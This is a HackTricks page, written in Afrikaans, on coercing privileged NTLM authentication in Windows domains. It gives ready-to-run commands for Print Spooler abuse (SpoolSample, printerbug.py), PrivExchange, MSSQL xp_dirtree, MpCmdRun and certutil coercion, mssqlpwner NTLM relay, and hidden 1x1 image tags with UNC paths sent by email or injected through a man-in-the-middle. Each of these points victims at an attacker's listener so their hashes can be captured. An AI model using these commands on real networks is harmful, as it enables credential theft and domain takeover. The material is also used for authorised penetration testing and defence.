# Force NTLM Privileged Authentication

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n **versameling** van **afgeleë autentikasie triggers** wat in C# gekodeer is met behulp van die MIDL-kompiler om 3departy afhanklikhede te vermy.

## Spooler Service Abuse

As die _**Print Spooler**_ diens **geaktiveer** is, kan jy 'n paar reeds bekende AD-akkrediteeringe gebruik om 'n **versoek** aan die Domeinbeheerder se drukbediener te doen vir 'n **opdatering** oor nuwe drukwerk en net vir dit te sê om die **kennisgewing na 'n stelsel te stuur**.\
Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsel stuur, dit moet **autentiseer teen** daardie **stelsel**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat autentiseer teen 'n arbitrêre stelsel, en die diens sal die **rekenaarrekening** in hierdie autentisering **gebruik**.

### Finding Windows Servers on the domain

Gebruik PowerShell om 'n lys van Windows-bokse te kry. Bedieners is gewoonlik prioriteit, so kom ons fokus daar:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Finding Spooler services listening

Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler-diens luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
U kan ook rpcdump.py op Linux gebruik en soek na die MS-RPRN Protokol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Vra die diens om teen 'n arbitrêre gasheer te verifieer

Jy kan[ **SpoolSample hier van**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** saamstel.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte se dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinasie met Onbeperkte Delegasie

As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Delegasie](unconstrained-delegation.md) gecompromitteer het, kan die aanvaller **die drukker laat outentiseer teen hierdie rekenaar**. As gevolg van die onbeperkte delegasie, sal die **TGT** van die **rekenaarrekening van die drukker** **in** die **geheue** van die rekenaar met onbeperkte delegasie **gestoor word**. Aangesien die aanvaller hierdie gasheer reeds gecompromitteer het, sal hy in staat wees om **hierdie kaartjie te onttrek** en dit te misbruik ([Pass the Ticket](pass-the-ticket.md)).

## RCP Force outentisering

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Die `PrivExchange` aanval is 'n gevolg van 'n fout wat in die **Exchange Server `PushSubscription` kenmerk** gevind is. Hierdie kenmerk laat die Exchange-server toe om deur enige domein gebruiker met 'n posbus gedwing te word om aan enige kliënt-gelewerde gasheer oor HTTP te outentiseer.

Standaard loop die **Exchange diens as SYSTEM** en word dit oorgenoeg bevoegdhede gegee (specifiek, dit het **WriteDacl bevoegdhede op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan misbruik word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheer binne die domein te outentiseer. Die suksesvolle misbruik van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.

## Binne Windows

As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind deur gebruik te maak van bevoorregte rekeninge met:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om certutil.exe lolbin (Microsoft-onderteken binêre) te gebruik om NTLM-outeentifikasie te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-inspuiting

### Deur e-pos

As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy hom eenvoudig 'n **e-pos met 'n 1x1 beeld** soos stuur
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
en wanneer hy dit oopmaak, sal hy probeer om te autentiseer.

### MitM

As jy 'n MitM-aanval op 'n rekenaar kan uitvoer en HTML in 'n bladsy kan inspuit wat hy sal visualiseer, kan jy probeer om 'n beeld soos die volgende in die bladsy in te spuit:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Krake NTLMv1

As jy [NTLMv1 uitdagings kan vang, lees hier hoe om hulle te krake](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emember dat jy om NTLMv1 te krake, die Responder-uitdaging op "1122334455667788" moet stel._

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
